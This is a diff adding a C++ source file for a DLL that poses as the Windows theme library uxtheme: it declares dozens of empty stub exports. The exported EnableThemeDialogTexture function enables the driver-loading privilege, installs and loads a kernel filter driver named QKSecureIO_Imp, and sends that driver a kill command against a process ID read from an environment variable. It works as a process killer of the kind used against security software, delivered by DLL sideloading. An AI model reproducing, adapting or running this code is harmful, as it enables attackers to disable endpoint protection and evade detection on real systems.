@@ -1,0 +1,440 @@
+#include <windows.h>
+#include <fstream>
+#include <string>
+#include <fltUser.h>
+#include <stdio.h>
+
+#pragma pack(push,1)
+struct KILL_STRUCT {
+    BYTE Pad0[8];
+    DWORD CommandCode;
+    BYTE Pad1[4];
+    DWORD PID;
+    BYTE Pad2[52];
+};
+#pragma pack(pop)
+static_assert(sizeof(KILL_STRUCT) == 0x48, "KILL_STRUCT must be 0x48 bytes");
+
+bool EnableLoadDriverPrivilege() {
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tp;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        printf("[-] OpenProcessToken failed: %lu\n", GetLastError());
+        return false;
+    }
+
+    if (!LookupPrivilegeValue(NULL, SE_LOAD_DRIVER_NAME, &tp.Privileges[0].Luid)) {
+        printf("[-] LookupPrivilegeValue failed: %lu\n", GetLastError());
+        CloseHandle(hToken);
+        return false;
+    }
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
+        printf("[-] AdjustTokenPrivileges failed: %lu\n", GetLastError());
+        CloseHandle(hToken);
+        return false;
+    }
+
+    CloseHandle(hToken);
+    return true;
+}
+
+bool LoadDriver(
+    const wchar_t* serviceName,
+    const wchar_t* displayName,
+    const wchar_t* driverPath)
+{
+    SC_HANDLE hSCManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
+    if (!hSCManager) {
+        printf("[-] OpenSCManager failed: %lu\n", GetLastError());
+        return false;
+    }
+
+    SC_HANDLE hService = CreateServiceW(
+        hSCManager,
+        serviceName,
+        displayName,
+        SERVICE_ALL_ACCESS,
+        SERVICE_KERNEL_DRIVER,
+        SERVICE_SYSTEM_START,
+        SERVICE_ERROR_IGNORE,
+        driverPath,
+        L"FSFilter Activity Monitor",
+        nullptr,
+        L"FltMgr",
+        nullptr, 
+        nullptr 
+    );
+
+    if (!hService) {
+        printf("[-] CreateService failed: %lu\n", GetLastError());
+        CloseServiceHandle(hSCManager);
+        return true;
+    }
+
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hSCManager);
+
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
+        L"SYSTEM\\CurrentControlSet\\Services\\QKSecureIO_Imp",
+        0,
+        KEY_SET_VALUE,
+        &hKey) == ERROR_SUCCESS)
+    {
+        DWORD type = 0x2;
+        RegSetValueExW(hKey, L"Type", 0, REG_DWORD,
+            (const BYTE*)&type, sizeof(type));
+        RegCloseKey(hKey);
+    }
+
+    HKEY hInstancesKey;
+    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
+        L"SYSTEM\\CurrentControlSet\\Services\\QKSecureIO_Imp\\Instances",
+        0, nullptr, 0, KEY_SET_VALUE, nullptr, &hInstancesKey, nullptr) == ERROR_SUCCESS)
+    {
+        const wchar_t* defaultInstance = L"QKSecureIO_Imp Instance";
+        RegSetValueExW(hInstancesKey, L"DefaultInstance", 0, REG_SZ,
+            (const BYTE*)defaultInstance,
+            (DWORD)((wcslen(defaultInstance) + 1) * sizeof(wchar_t)));
+        RegCloseKey(hInstancesKey);
+    }
+    else {
+        printf("[-] Failed to create Instances key.\n");
+        return false;
+    }
+
+    HKEY hInstanceKey;
+    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
+        L"SYSTEM\\CurrentControlSet\\Services\\QKSecureIO_Imp\\Instances\\QKSecureIO_Imp Instance",
+        0, nullptr, 0, KEY_SET_VALUE, nullptr, &hInstanceKey, nullptr) == ERROR_SUCCESS)
+    {
+        const wchar_t* altitude = L"880089";
+        RegSetValueExW(hInstanceKey, L"Altitude", 0, REG_SZ,
+            (const BYTE*)altitude,
+            (DWORD)((wcslen(altitude) + 1) * sizeof(wchar_t)));
+        DWORD flags = 0x0;
+        RegSetValueExW(hInstanceKey, L"Flags", 0, REG_DWORD,
+            (const BYTE*)&flags, sizeof(flags));
+        RegCloseKey(hInstanceKey);
+    }
+    else {
+        printf("[-] Failed to create QKSecureIO_Imp Instance key.\n");
+        return false;
+    }
+
+    HRESULT hr = FilterLoad(L"QKSecureIO_Imp");
+    if (FAILED(hr)) {
+        printf("[-] FilterLoad failed: 0x%X\n", hr);
+    }
+
+    return true;
+}
+
+bool UnloadDriver(const wchar_t* serviceName)
+{
+    SC_HANDLE hSCManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT);
+    if (!hSCManager) {
+        printf("[-] OpenSCManager failed: %lu\n", GetLastError());
+        return false;
+    }
+    SC_HANDLE hService = OpenServiceW(hSCManager, serviceName, SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
+    if (!hService) {
+        printf("[-] OpenService failed: %lu\n", GetLastError());
+        CloseServiceHandle(hSCManager);
+        return false;
+    }
+    SERVICE_STATUS status{};
+    if (QueryServiceStatus(hService, &status)) {
+        if (status.dwCurrentState != SERVICE_STOPPED) {
+            if (ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
+                printf("[+] Stopping service...\n");
+                Sleep(1000);
+                while (QueryServiceStatus(hService, &status)) {
+                    if (status.dwCurrentState == SERVICE_STOPPED)
+                        break;
+                    Sleep(500);
+                }
+            }
+            else {
+                printf("[-] ControlService failed: %lu\n", GetLastError());
+            }
+        }
+    }
+    HRESULT hr = FilterUnload(serviceName);
+    if (FAILED(hr)) {
+        printf("[-] FilterUnload failed: 0x%X\n", hr);
+    }
+
+    if (!DeleteService(hService)) {
+        printf("[-] DeleteService failed: %lu\n", GetLastError());
+    }
+
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hSCManager);
+    return true;
+}
+
+DWORD GetPidFromEnv()
+{
+    wchar_t buf[32];
+    DWORD needed = GetEnvironmentVariableW(L"pid", buf, _countof(buf));
+    if (needed == 0 || needed >= _countof(buf)) {
+        return 0;
+    }
+    errno = 0;
+    wchar_t* endptr = nullptr;
+    unsigned long val = wcstoul(buf, &endptr, 10);
+    if (endptr == buf || *endptr != L'\0' || errno == ERANGE) {
+        return 0;
+    }
+    if (val == 0) {
+        return 0;
+    }
+    return static_cast<DWORD>(val);
+}
+
+int main_func() {
+    DWORD pid = GetPidFromEnv();
+    if (!pid) {
+        printf("\n[-] Failed to get PID from environment variable\n");
+        printf("[i] Set PID by `set pid=<pid>`\n");
+        return 1;
+    }
+
+    if (!EnableLoadDriverPrivilege()) {
+        printf("Failed to enable SeLoadDriverPrivilege.\n");
+        return 1;
+    }
+
+    const wchar_t* serviceName = L"QKSecureIO_Imp";
+    const wchar_t* displayName = L"QKSecureIO_Imp";
+    const wchar_t* driverPath = L"C:\\Windows\\system32\\drivers\\QKSecureIO_Imp.sys";
+
+    if (!LoadDriver(serviceName, displayName, driverPath)) {
+        printf("[-] Failed to create driver service.\n");
+        return 1;
+    }
+
+
+    HANDLE hPort = NULL;
+    HRESULT hr;
+    const wchar_t* portName = L"\\QKSecureIOPort_Imp";
+    hr = FilterConnectCommunicationPort(portName,0,NULL,0,NULL,&hPort);
+
+    if (FAILED(hr)) {
+        printf("\n[-] Failed to connect to port. HRESULT: 0x%X\n", hr);
+        return 1;
+    }
+
+    printf("\n[i] Successfully connected to port!\n");
+
+    KILL_STRUCT inputBuffer{};
+    RtlSecureZeroMemory(&inputBuffer, sizeof(inputBuffer));
+    inputBuffer.CommandCode = 0x4081;
+    inputBuffer.PID = pid;
+
+    unsigned char outputBuffer[4] = { 0 };
+    DWORD bytesReturned = 0;
+
+    hr = FilterSendMessage(
+        hPort,
+        &inputBuffer,
+        sizeof(inputBuffer),
+        &outputBuffer,
+        sizeof(outputBuffer),
+        &bytesReturned
+    );
+
+    if (FAILED(hr)) {
+        printf("[-] Failed to kill process. HRESULT: 0x%X\n", hr);
+    }
+    printf("[+] Process should be terminated soon!\n");
+    if (hPort) CloseHandle(hPort);
+
+    UnloadDriver(L"QKSecureIO_Imp");
+    return 0;
+}
+
+extern "C" __declspec(dllexport) void BufferedPaintRenderAnimation();
+extern "C" __declspec(dllexport) void BufferedPaintSetAlpha();
+extern "C" __declspec(dllexport) void BufferedPaintStopAllAnimations();
+extern "C" __declspec(dllexport) void BufferedPaintUnInit();
+extern "C" __declspec(dllexport) void CloseThemeData();
+extern "C" __declspec(dllexport) void DllGetActivationFactory();
+extern "C" __declspec(dllexport) void DrawThemeBackground();
+extern "C" __declspec(dllexport) void DrawThemeBackgroundEx();
+extern "C" __declspec(dllexport) void DrawThemeEdge();
+extern "C" __declspec(dllexport) void DrawThemeIcon();
+extern "C" __declspec(dllexport) void DrawThemeParentBackground();
+extern "C" __declspec(dllexport) void DrawThemeParentBackgroundEx();
+extern "C" __declspec(dllexport) void DrawThemeText();
+extern "C" __declspec(dllexport) void DrawThemeTextEx();
+extern "C" __declspec(dllexport) void EnableThemeDialogTexture();
+extern "C" __declspec(dllexport) void EnableTheming();
+extern "C" __declspec(dllexport) void EndBufferedAnimation();
+extern "C" __declspec(dllexport) void EndBufferedPaint();
+extern "C" __declspec(dllexport) void EndPanningFeedback();
+extern "C" __declspec(dllexport) void GetBufferedPaintBits();
+extern "C" __declspec(dllexport) void GetBufferedPaintDC();
+extern "C" __declspec(dllexport) void GetBufferedPaintTargetDC();
+extern "C" __declspec(dllexport) void GetBufferedPaintTargetRect();
+extern "C" __declspec(dllexport) void GetColorFromPreference();
+extern "C" __declspec(dllexport) void GetCurrentThemeName();
+extern "C" __declspec(dllexport) void GetImmersiveColorFromColorSetEx();
+extern "C" __declspec(dllexport) void GetImmersiveUserColorSetPreference();
+extern "C" __declspec(dllexport) void GetThemeAnimationProperty();
+extern "C" __declspec(dllexport) void GetThemeAnimationTransform();
+extern "C" __declspec(dllexport) void GetThemeAppProperties();
+extern "C" __declspec(dllexport) void GetThemeBackgroundContentRect();
+extern "C" __declspec(dllexport) void GetThemeBackgroundExtent();
+extern "C" __declspec(dllexport) void GetThemeBackgroundRegion();
+extern "C" __declspec(dllexport) void GetThemeBitmap();
+extern "C" __declspec(dllexport) void GetThemeBool();
+extern "C" __declspec(dllexport) void GetThemeColor();
+extern "C" __declspec(dllexport) void GetThemeDocumentationProperty();
+extern "C" __declspec(dllexport) void GetThemeEnumValue();
+extern "C" __declspec(dllexport) void GetThemeFilename();
+extern "C" __declspec(dllexport) void GetThemeFont();
+extern "C" __declspec(dllexport) void GetThemeInt();
+extern "C" __declspec(dllexport) void GetThemeIntList();
+extern "C" __declspec(dllexport) void GetThemeMargins();
+extern "C" __declspec(dllexport) void GetThemeMetric();
+extern "C" __declspec(dllexport) void GetThemePartSize();
+extern "C" __declspec(dllexport) void GetThemePosition();
+extern "C" __declspec(dllexport) void GetThemePropertyOrigin();
+extern "C" __declspec(dllexport) void GetThemeRect();
+extern "C" __declspec(dllexport) void GetThemeStream();
+extern "C" __declspec(dllexport) void GetThemeString();
+extern "C" __declspec(dllexport) void GetThemeSysBool();
+extern "C" __declspec(dllexport) void GetThemeSysColor();
+extern "C" __declspec(dllexport) void GetThemeSysColorBrush();
+extern "C" __declspec(dllexport) void GetThemeSysFont();
+extern "C" __declspec(dllexport) void GetThemeSysInt();
+extern "C" __declspec(dllexport) void GetThemeSysSize();
+extern "C" __declspec(dllexport) void GetThemeSysString();
+extern "C" __declspec(dllexport) void GetThemeTextExtent();
+extern "C" __declspec(dllexport) void GetThemeTextMetrics();
+extern "C" __declspec(dllexport) void GetThemeTimingFunction();
+extern "C" __declspec(dllexport) void GetThemeTransitionDuration();
+extern "C" __declspec(dllexport) void GetUserColorPreference();
+extern "C" __declspec(dllexport) void GetWindowTheme();
+extern "C" __declspec(dllexport) void HitTestThemeBackground();
+extern "C" __declspec(dllexport) void IsAppThemed();
+extern "C" __declspec(dllexport) void IsCompositionActive();
+extern "C" __declspec(dllexport) void IsThemeActive();
+extern "C" __declspec(dllexport) void IsThemeBackgroundPartiallyTransparent();
+extern "C" __declspec(dllexport) void IsThemeDialogTextureEnabled();
+extern "C" __declspec(dllexport) void IsThemePartDefined();
+extern "C" __declspec(dllexport) void OpenThemeData();
+extern "C" __declspec(dllexport) void OpenThemeDataEx();
+extern "C" __declspec(dllexport) void OpenThemeDataForDpi();
+extern "C" __declspec(dllexport) void SetThemeAppProperties();
+extern "C" __declspec(dllexport) void SetWindowTheme();
+extern "C" __declspec(dllexport) void SetWindowThemeAttribute();
+extern "C" __declspec(dllexport) void ThemeInitApiHook();
+extern "C" __declspec(dllexport) void UpdatePanningFeedback();
+
+void EnableThemeDialogTexture() {
+    if (!AttachConsole(ATTACH_PARENT_PROCESS)) {
+        AllocConsole();
+    }
+
+    FILE* fp;
+    freopen_s(&fp, "CONOUT$", "w", stdout);
+    freopen_s(&fp, "CONOUT$", "w", stderr);
+
+    main_func();
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
+    return TRUE;
+}
+
+void BeginBufferedAnimation() {}
+void BeginBufferedPaint() {}
+void BeginPanningFeedback() {}
+void BufferedPaintClear() {}
+void BufferedPaintInit() {}
+void BufferedPaintRenderAnimation() {}
+void BufferedPaintSetAlpha() {}
+void BufferedPaintStopAllAnimations() {}
+void BufferedPaintUnInit() {}
+void CloseThemeData() {}
+void DllGetActivationFactory() {}
+void DllGetClassObject() {}
+void DrawThemeBackground() {}
+void DrawThemeBackgroundEx() {}
+void DrawThemeEdge() {}
+void DrawThemeIcon() {}
+void DrawThemeParentBackground() {}
+void DrawThemeParentBackgroundEx() {}
+void DrawThemeText() {}
+void DrawThemeTextEx() {}
+void EnableTheming() {}
+void EndBufferedAnimation() {}
+void EndBufferedPaint() {}
+void EndPanningFeedback() {}
+void GetBufferedPaintBits() {}
+void GetBufferedPaintDC() {}
+void GetBufferedPaintTargetDC() {}
+void GetBufferedPaintTargetRect() {}
+void GetColorFromPreference() {}
+void GetCurrentThemeName() {}
+void GetImmersiveColorFromColorSetEx() {}
+void GetImmersiveUserColorSetPreference() {}
+void GetThemeAnimationProperty() {}
+void GetThemeAnimationTransform() {}
+void GetThemeAppProperties() {}
+void GetThemeBackgroundContentRect() {}
+void GetThemeBackgroundExtent() {}
+void GetThemeBackgroundRegion() {}
+void GetThemeBitmap() {}
+void GetThemeBool() {}
+void GetThemeColor() {}
+void GetThemeDocumentationProperty() {}
+void GetThemeEnumValue() {}
+void GetThemeFilename() {}
+void GetThemeFont() {}
+void GetThemeInt() {}
+void GetThemeIntList() {}
+void GetThemeMargins() {}
+void GetThemeMetric() {}
+void GetThemePartSize() {}
+void GetThemePosition() {}
+void GetThemePropertyOrigin() {}
+void GetThemeRect() {}
+void GetThemeStream() {}
+void GetThemeString() {}
+void GetThemeSysBool() {}
+void GetThemeSysColor() {}
+void GetThemeSysColorBrush() {}
+void GetThemeSysFont() {}
+void GetThemeSysInt() {}
+void GetThemeSysSize() {}
+void GetThemeSysString() {}
+void GetThemeTextExtent() {}
+void GetThemeTextMetrics() {}
+void GetThemeTimingFunction() {}
+void GetThemeTransitionDuration() {}
+void GetUserColorPreference() {}
+void GetWindowTheme() {}
+void HitTestThemeBackground() {}
+void IsAppThemed() {}
+void IsCompositionActive() {}
+void IsThemeActive() {}
+void IsThemeBackgroundPartiallyTransparent() {}
+void IsThemeDialogTextureEnabled() {}
+void IsThemePartDefined() {}
+void OpenThemeData() {}
+void OpenThemeDataEx() {}
+void OpenThemeDataForDpi() {}
+void SetThemeAppProperties() {}
+void SetWindowTheme() {}
+void SetWindowThemeAttribute() {}
+void ThemeInitApiHook() {}
+void UpdatePanningFeedback() {}
